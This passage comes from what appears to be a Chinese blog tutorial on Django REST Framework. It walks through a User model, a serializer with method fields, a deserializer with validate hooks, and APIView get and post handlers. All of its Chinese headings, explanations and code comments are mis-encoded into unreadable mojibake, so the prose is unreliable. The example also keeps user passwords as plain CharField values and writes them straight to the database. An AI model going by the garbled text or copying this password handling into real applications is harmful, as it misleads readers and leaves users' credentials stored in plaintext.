class="line">        [<span class="number">0</span>,<span class="string">'Áî∑'</span>],</span><br><span class="line">        [<span class="number">1</span>,<span class="string">'Â•≥'</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    pwd = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    phone = models.CharField(max_length=<span class="number">11</span>,null=<span class="literal">True</span>,default=<span class="literal">None</span>)</span><br><span class="line">    sex = models.IntegerField(choices=SEX_CHOICES,default=<span class="number">0</span>)</span><br><span class="line">    icon = models.ImageField(upload_to=<span class="string">'icon'</span>,default=<span class="string">'icon/default.jpg'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table=<span class="string">'old_boy_user'</span></span><br><span class="line">        verbose_name=<span class="string">'Áî®Êà∑'</span></span><br><span class="line">        verbose_name_plural=verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s'</span> %self.name</span><br></pre></td></tr></table></figure><h4 id="ÈÖçÁΩÆÂ±Ç-settings.py">ÈÖçÁΩÆÂ±Ç <code>settings.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ê≥®ÂÜårest_framework</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># mediaËµÑÊ∫ê</span></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span>  <span class="comment"># ÂêéÊúüÈ´òÁ∫ßÂ∫èÂàóÂåñÁ±ª‰∏éËßÜÂõæÁ±ªÔºå‰ºö‰ΩøÁî®ËØ•ÈÖçÁΩÆ</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)  <span class="comment"># mediaËµÑÊ∫êË∑ØÂæÑ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ÂõΩÈôÖÂåñÈÖçÁΩÆ</span></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="Â∫èÂàóÂåñÂ±Ç-apiserializers.py">Â∫èÂàóÂåñÂ±Ç <code>api/serializers.py</code></h4><ol type="1"><li><code>api</code>Â∫îÁî®‰∏ãÂàõÂª∫<code>serializers.py</code>Êñá‰ª∂</li><li>ËÆæÁΩÆÈúÄË¶ÅËøîÂõûÁªôÂâçÂè∞Êï∞ÊçÆÊ†∑Âºè ÈÇ£‰∫õ<code>model</code>Á±ªÊúâÂØπÂ∫îÁöÑÂ≠óÊÆµÔºå‰∏çÈúÄË¶ÅËøîÂõûÁöÑÂ∞±‰∏çÁî®ËÆæÁΩÆ‰∫Ü</li><li>ËÆæÁΩÆÊñπÊ≥ïÂ≠óÊÆµÔºåÂ≠óÊÆµÂêçÂèØ‰ª•ÈöèÊÑèÔºåÂ≠óÊÆµÂÄºÁî± <code>get_Â≠óÊÆµÂêç</code> Êèê‰æõÔºåÊù•ÂÆåÊàê‰∏Ä‰∫õÈúÄË¶ÅÂ§ÑÁêÜÂú®ËøîÂõûÁöÑÊï∞ÊçÆÔºåÁ±ª‰ºº‰∫é<code>forms</code>ÁªÑ‰ª∂</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers, exceptions</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserSerializer</span><span class="params">(serializers.Serializer)</span>:</span>   <span class="comment">#ÂàõÂª∫‰∏Ä‰∏™Â∫èÂàóÂåñÁ±ª</span></span><br><span class="line">    name = serializers.CharField()      </span><br><span class="line">    phone = serializers.CharField()</span><br><span class="line">    <span class="comment"># Â∫èÂàóÂåñÊèê‰æõÁªôÂâçÂè∞ÁöÑÂ≠óÊÆµ‰∏™Êï∞Áî±ÂêéÂè∞ÂÜ≥ÂÆöÔºåÂèØ‰ª•Â∞ëÊèê‰æõÔºå‰ΩÜÊòØÊèê‰æõÁöÑÊï∞ÊçÆÂ∫ìÂØπÂ∫îÁöÑÂ≠óÊÆµÔºåÂêçÂ≠ó‰∏ÄÂÆöË¶Å‰∏éÊï∞ÊçÆÂ∫ìÂ≠óÊÆµÁõ∏Âêå</span></span><br><span class="line">    <span class="comment"># sex = serializers.IntegerField()</span></span><br><span class="line">    <span class="comment"># icon = serializers.ImageField()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ëá™ÂÆö‰πâÂ∫èÂàóÂåñÂ±ûÊÄß</span></span><br><span class="line">    <span class="comment"># Â±ûÊÄßÂêçÈöèÊÑèÔºåÂÄºÁî±Âõ∫ÂÆöÁöÑÂëΩÂêçËßÑËåÉÊñπÊ≥ïÊèê‰æõ:</span></span><br><span class="line">    <span class="comment">#       get_Â±ûÊÄßÂêç(self, ÂèÇ‰∏éÂ∫èÂàóÂåñÁöÑmodelÂØπË±°)</span></span><br><span class="line">    <span class="comment">#       ËøîÂõûÂÄºÂ∞±ÊòØËá™ÂÆö‰πâÂ∫èÂàóÂåñÂ±ûÊÄßÁöÑÂÄº</span></span><br><span class="line">    gender = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_gender</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># choiceÁ±ªÂûãÁöÑËß£ÈáäÂûãÂÄº get_Â≠óÊÆµ_display() Êù•ËÆøÈóÆ</span></span><br><span class="line">        <span class="keyword">return</span> obj.get_sex_display()</span><br><span class="line"></span><br><span class="line">„ÄÄ„ÄÄ <span class="comment">#Ëá™ÂÆö‰πâÂ∫èÂàóÂåñÂ±ûÊÄßicon</span></span><br><span class="line">    icon = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_icon</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># settings.MEDIA_URL: Ëá™Â∑±ÈÖçÁΩÆÁöÑ /media/ÔºåÁªôÂêéÈù¢È´òÁ∫ßÂ∫èÂàóÂåñ‰∏éËßÜÂõæÁ±ªÂáÜÂ§áÁöÑ</span></span><br><span class="line">        <span class="comment"># obj.icon‰∏çËÉΩÁõ¥Êé•‰Ωú‰∏∫Êï∞ÊçÆËøîÂõûÔºåÂõ†‰∏∫ÂÜÖÂÆπËôΩÁÑ∂ÊòØÂ≠óÁ¨¶‰∏≤Ôºå‰ΩÜÊòØÁ±ªÂûãÊòØImageFieldFileÁ±ªÂûã</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s%s%s'</span> % (<span class="string">r'http://127.0.0.1:8000'</span>, settings.MEDIA_URL, str(obj.icon))</span><br></pre></td></tr></table></figure><h4 id="ËßÜÂõæÂ±Ç-views.py">ËßÜÂõæÂ±Ç <code>views.py</code></h4><ol type="1"><li>‰ªéÊï∞ÊçÆÂ∫ì‰∏≠Â∞ÜË¶ÅÂ∫èÂàóÂåñÁªôÂâçÂè∞ÁöÑ<code>model</code>ÂØπË±°ÔºåÊàñÊòØÂ§ö‰∏™<code>model</code>ÂØπË±°Êü•ËØ¢Âá∫Êù•</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_obj = models.User.objects.get(pk=pk)</span><br></pre></td></tr></table></figure><p>ÊàñËÄÖ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_obj_list = models.User.objects.all()</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>Â∫èÂàóÂåñ: <code>ÂØπË±°.data</code> Â∞±ÊòØÂèØ‰ª•ËøîÂõûÁªôÂâçÂè∞ÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆ</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> Response(&#123;</span><br><span class="line">    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'results'</span>: user_ser.data</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ÂÆåÊï¥‰ª£Á†ÅÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:  <span class="comment">#ÂçïÊü•</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Áî®Êà∑ÂØπË±°‰∏çËÉΩÁõ¥Êé•‰Ωú‰∏∫Êï∞ÊçÆËøîÂõûÁªôÂâçÂè∞</span></span><br><span class="line">                user_obj = models.User.objects.get(pk=pk)</span><br><span class="line">                <span class="comment"># Â∫èÂàóÂåñ‰∏Ä‰∏ãÁî®Êà∑ÂØπË±°</span></span><br><span class="line">                user_ser = serializers.UserSerializer(user_obj)</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'results'</span>: user_ser.data   <span class="comment">#Â¶ÇÊûú‰Ω†Âú®Â∫èÂàóÂåñÁöÑÊó∂ÂÄôÊ≤°Êúâ.data,ÈÇ£‰πàÂú®‰º†ÁªôÂâçÁ´ØÁöÑÊó∂ÂÄôÂøÖÈ°ªË¶Å.data</span></span><br><span class="line">                &#125;)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">2</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'Áî®Êà∑‰∏çÂ≠òÂú®'</span>,</span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment">#Áæ§Êü•</span></span><br><span class="line">            <span class="comment"># Áî®Êà∑ÂØπË±°ÂàóË°®(queryset)‰∏çËÉΩÁõ¥Êé•‰Ωú‰∏∫Êï∞ÊçÆËøîÂõûÁªôÂâçÂè∞</span></span><br><span class="line">            user_obj_list = models.User.objects.all()</span><br><span class="line">            <span class="comment"># Â∫èÂàóÂåñ‰∏Ä‰∏ãÁî®Êà∑ÂØπË±°</span></span><br><span class="line">            user_ser_data = serializers.UserSerializer(user_obj_list, many=<span class="literal">True</span>).data</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'results'</span>: user_ser_data</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure><h3 id="ÂèçÂ∫èÂàóÂåñ">ÂèçÂ∫èÂàóÂåñ</h3><h4 id="ÂèçÂ∫èÂàóÂ±Ç-apiserializers.py">ÂèçÂ∫èÂàóÂ±Ç <code>api/serializers.py</code></h4><ol type="1"><li>ËÆæÁΩÆÂøÖÂ°´‰∏éÈÄâÂ°´Â∫èÂàóÂåñÂ≠óÊÆµÔºåËÆæÁΩÆÊ†°È™åËßÑÂàô</li><li>‰∏∫ÈúÄË¶ÅÈ¢ùÂ§ñÊ†°È™åÁöÑÂ≠óÊÆµÊèê‰æõÂ±ÄÈÉ®Èí©Â≠êÂáΩÊï∞ÔºåÂ¶ÇÊûúËØ•Â≠óÊÆµ‰∏çÂÖ•Â∫ìÔºå‰∏î‰∏çÂèÇ‰∏éÂÖ®Â±ÄÈí©Â≠êÊ†°È™åÔºåÂèØ‰ª•Â∞ÜÂÄºÂèñÂá∫Ê†°È™å <code>pop</code></li><li>‰∏∫ÊúâËÅîÂêàÂÖ≥Á≥ªÁöÑÂ≠óÊÆµ‰ª¨Êèê‰æõÂÖ®Â±ÄÈí©Â≠êÂáΩÊï∞ÔºåÂ¶ÇÊûúÊüê‰∫õÂ≠óÊÆµ‰∏çÂÖ•Â∫ìÔºåÂèØ‰ª•Â∞ÜÂÄºÂèñÂá∫Ê†°È™å</li><li><strong>ÂøÖÈ°ªÈáçÂÜô<code>create</code>ÊñπÊ≥ïÔºåÂÆåÊàêÊ†°È™åÈÄöËøáÁöÑÊï∞ÊçÆÂÖ•Â∫ìÂ∑•‰ΩúÔºåÂæóÂà∞Êñ∞Â¢ûÁöÑÂØπË±°</strong></li></ol><p>ÂÆåÊï¥‰ª£Á†ÅÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDeserializer</span><span class="params">(serializers.Serializer)</span>:</span></span><br><span class="line">    <span class="comment"># 1) Âì™‰∫õÂ≠óÊÆµÂøÖÈ°ªÂèçÂ∫èÂàóÂåñ</span></span><br><span class="line">    <span class="comment"># 2) Â≠óÊÆµÈÉΩÊúâÂì™‰∫õÂÆâÂÖ®Ê†°È™å</span></span><br><span class="line">    <span class="comment"># 3) Âì™‰∫õÂ≠óÊÆµÈúÄË¶ÅÈ¢ùÂ§ñÊèê‰æõÊ†°È™å  Èí©Â≠êÂáΩÊï∞</span></span><br><span class="line">    <span class="comment"># 4) Âì™‰∫õÂ≠óÊÆµÈó¥Â≠òÂú®ËÅîÂêàÊ†°È™å</span></span><br><span class="line">    <span class="comment"># Ê≥®ÔºöÂèçÂ∫èÂàóÂåñÂ≠óÊÆµÈÉΩÊòØÁî®Êù•ÂÖ•Â∫ìÁöÑÔºå‰∏ç‰ºöÂá∫Áé∞Ëá™ÂÆö‰πâÊñπÊ≥ïÂ±ûÊÄßÔºå‰ºöÂá∫Áé∞ÂèØ‰ª•ËÆæÁΩÆÊ†°È™åËßÑÂàôÁöÑËá™ÂÆö‰πâÂ±ûÊÄß,‰∏çÂÖ•Êï∞ÊçÆÂ∫ìÁöÑ</span></span><br><span class="line">    name = serializers.CharField(</span><br><span class="line">        max_length=<span class="number">64</span>,</span><br><span class="line">        min_length=<span class="number">3</span>,</span><br><span class="line">        error_messages=&#123;</span><br><span class="line">            <span class="string">'max_length'</span>: <span class="string">'Â§™Èïø'</span>,</span><br><span class="line">            <span class="string">'min_length'</span>: <span class="string">'Â§™Áü≠'</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    pwd = serializers.CharField()</span><br><span class="line">    phone = serializers.CharField(required=<span class="literal">False</span>)</span><br><span class="line">    sex = serializers.IntegerField(required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ëá™ÂÆö‰πâÊúâÊ†°È™åËßÑÂàôÁöÑÂèçÂ∫èÂàóÂåñÂ≠óÊÆµ,‰æãÂ¶ÇÁ°ÆËÆ§ÂØÜÁ†ÅÂ≠óÊÆµre_pwd</span></span><br><span class="line">    re_pwd = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Â∞èÁªìÔºö</span></span><br><span class="line">    <span class="comment"># nameÔºåpwdÔºåre_pwd‰∏∫ÂøÖÂ°´Â≠óÊÆµ</span></span><br><span class="line">    <span class="comment"># phoneÔºåsex‰∏∫ÈÄâÂ°´Â≠óÊÆµ</span></span><br><span class="line">    <span class="comment"># ‰∫î‰∏™Â≠óÊÆµÈÉΩÂøÖÈ°ªÊèê‰æõÂÆåÊàêÁöÑÊ†°È™åËßÑÂàô</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Â±ÄÈÉ®Èí©Â≠êÔºövalidate_Ë¶ÅÊ†°È™åÁöÑÂ≠óÊÆµÂêç(self, ÂΩìÂâçË¶ÅÊ†°È™åÂ≠óÊÆµÁöÑÂÄº)</span></span><br><span class="line">    <span class="comment"># Ê†°È™åËßÑÂàôÔºöÊ†°È™åÈÄöËøáËøîÂõûÂéüÂÄºÔºåÊ†°È™åÂ§±Ë¥•ÔºåÊäõÂá∫ÂºÇÂ∏∏</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():  <span class="comment"># ÂêçÂ≠ó‰∏≠‰∏çËÉΩÂá∫Áé∞g</span></span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(<span class="string">'ÂêçÂ≠óÈùûÊ≥ïÔºåÊòØ‰∏™È∏°Ë¥ºÔºÅ'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ÂÖ®Â±ÄÈí©Â≠êÔºövalidate(self, ÈÄöËøáÁ≥ªÁªü‰∏éÂ±ÄÈÉ®Èí©Â≠êÊ†°È™å‰πãÂêéÁöÑÊâÄÊúâÊï∞ÊçÆ)</span></span><br><span class="line">    <span class="comment"># Ê†°È™åËßÑÂàôÔºöÊ†°È™åÈÄöËøáËøîÂõûÂéüÂÄºÔºåÊ†°È™åÂ§±Ë¥•ÔºåÊäõÂá∫ÂºÇÂ∏∏</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span>    <span class="comment">#attrsÊòØÂ≠óÂÖ∏Ê†ºÂºè</span></span><br><span class="line">        pwd = attrs.get(<span class="string">'pwd'</span>)</span><br><span class="line">        re_pwd = attrs.pop(<span class="string">'re_pwd'</span>)     <span class="comment">#Âõ†‰∏∫re_pwd‰∏çÈúÄË¶ÅÂÖ•Êï∞ÊçÆÂ∫ìÔºåÊâÄ‰ª•Âú®ÂÖ®Â±ÄÈí©Â≠êÊ†°È™å‰∏≠Âà†Èô§ÊéâËøô‰∏™Â≠óÊÆµ</span></span><br><span class="line">        <span class="keyword">if</span> pwd != re_pwd:</span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(&#123;<span class="string">'pwd&amp;re_pwd'</span>: <span class="string">'‰∏§Ê¨°ÂØÜÁ†Å‰∏ç‰∏ÄËá¥'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ë¶ÅÂÆåÊàêÊñ∞Â¢ûÔºåÂøÖÈ°ªËá™Â∑±ÈáçÂÜô create ÊñπÊ≥ïÔºåvalidated_dataÊòØÊ†°È™åÁöÑÊï∞ÊçÆ</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># Â∞ΩÈáèÂú®ÊâÄÊúâÊ†°È™åËßÑÂàôÂÆåÊØï‰πãÂêéÔºåÊï∞ÊçÆÂèØ‰ª•Áõ¥Êé•ÂÖ•Â∫ì</span></span><br><span class="line">        <span class="keyword">return</span> models.User.objects.create(**validated_data)</span><br></pre></td></tr></table></figure><h4 id="ËßÜÂõæÂ±Ç-views.py-1">ËßÜÂõæÂ±Ç views.py</h4><ol type="1"><li>ÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÂøÖÈ°ªËµãÂÄº<code>data</code>ÔºåÁªìÊûúÂ∞±ÊòØÂæóÂà∞‰∏Ä‰∏™<code>serializer</code>ÂØπË±°</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book_ser = serializers.UserDeserializer(data=request_data)</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>ÊääÊï∞ÊçÆÊîæÂà∞Ëá™ÂÆö‰πâ<code>serializer</code>‰∏≠Ê†°È™åÔºåÊï∞ÊçÆÊ†°È™åÊàêÂäüËøîÂõû<code>True</code>,Â§±Ë¥•ËøîÂõû<code>False</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book_ser.is_valid()</span><br></pre></td></tr></table></figure><ol start="3" type="1"><li>‰∏çÈÄöËøáËøîÂõû <code>book_ser.errors</code> ÁªôÂâçÂè∞ÔºåÈÄöËøá <code>book_ser.save()</code> ÂæóÂà∞Êñ∞Â¢ûÁöÑÂØπË±°ÔºåÂÜçÊ≠£Â∏∏ËøîÂõû</li></ol><p>ÂÆåÊï¥‰ª£Á†ÅÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># Âè™ËÄÉËôëÂçïÂ¢û</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># ËØ∑Ê±ÇÊï∞ÊçÆ</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="comment"># Êï∞ÊçÆÊòØÂê¶ÂêàÊ≥ïÔºàÂ¢ûÂä†ÂØπË±°ÈúÄË¶Å‰∏Ä‰∏™Â≠óÂÖ∏Êï∞ÊçÆÔºâ</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(request_data, dict) <span class="keyword">or</span> request_data == &#123;&#125;:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'Êï∞ÊçÆÊúâËØØ'</span>,</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="comment"># Êï∞ÊçÆÁ±ªÂûãÂêàÊ≥ïÔºå‰ΩÜÊï∞ÊçÆÂÜÖÂÆπ‰∏ç‰∏ÄÂÆöÂêàÊ≥ïÔºåÈúÄË¶ÅÊ†°È™åÊï∞ÊçÆÔºåÊ†°È™å(ÂèÇ‰∏éÂèçÂ∫èÂàóÂåñ)ÁöÑÊï∞ÊçÆÈúÄË¶ÅËµãÂÄºÁªôdata</span></span><br><span class="line">        book_ser = serializers.UserDeserializer(data=request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Â∫èÂàóÂåñÂØπË±°Ë∞ÉÁî®is_valid()ÂÆåÊàêÊ†°È™åÔºåÊ†°È™åÂ§±Ë¥•ÁöÑÂ§±Ë¥•‰ø°ÊÅØÈÉΩ‰ºöË¢´Â≠òÂÇ®Âú® Â∫èÂàóÂåñÂØπË±°.errors</span></span><br><span class="line">        <span class="keyword">if</span> book_ser.is_valid():</span><br><span class="line">            <span class="comment"># Ê†°È™åÈÄöËøáÔºåÂÆåÊàêÊñ∞Â¢û</span></span><br><span class="line">            book_obj = book_ser.save()</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">                <span class="string">'results'</span>: serializers.UserSerializer(book_obj).data</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Ê†°È™åÂ§±Ë¥•</span></span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: book_ser.errors,</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure><h1 id="ÊÄªÁªì">ÊÄªÁªì</h1><ol type="1"><li>‰ΩøÁî®Â∫èÂàóÂåñÂô®ÁöÑÊó∂ÂÄô‰∏ÄÂÆöË¶ÅÊ≥®ÊÑèÔºåÂ∫èÂàóÂåñÂô®Â£∞Êòé‰∫Ü‰ª•ÂêéÔºå‰∏ç‰ºöËá™Âä®ÊâßË°åÔºåÈúÄË¶ÅÊàë‰ª¨Âú®ËßÜÂõæ‰∏≠ËøõË°åË∞ÉÁî®ÊâçÂèØ‰ª•</li><li>Â∫èÂàóÂåñÂô®Êó†Ê≥ïÁõ¥Êé•Êé•Êî∂Êï∞ÊçÆÔºåÈúÄË¶ÅÊàë‰ª¨Âú®ËßÜÂõæ‰∏≠ÂàõÂª∫Â∫èÂàóÂåñÂô®ÂØπË±°Êó∂Êää‰ΩøÁî®ÁöÑÊï∞ÊçÆ‰º†ÈÄíËøáÊù•„ÄÇÔºà<code>data</code>, 